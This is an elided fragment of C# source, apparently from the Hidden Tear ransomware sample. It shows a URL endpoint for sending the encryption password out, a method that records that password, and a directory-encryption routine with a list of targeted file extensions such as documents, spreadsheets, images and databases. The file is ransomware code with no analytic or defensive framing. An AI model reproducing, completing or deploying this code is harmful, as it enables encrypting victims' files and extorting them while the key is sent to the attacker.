...
namespace hidden_tear
{
    public partial class Form1 : Form
    {
        ...
        string targetURL = "http://localhost/hidden-tear/write.php?info=";
        ...
        public void SendPassword(string password){
            ...
            string[] names = new string[] { password };
            using (StreamWriter sw = new StreamWriter("C://textfile.txt"))
            {
        ...
        public void encryptDirectory(string location, string password)
        {
            ...
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd","rar"
            };
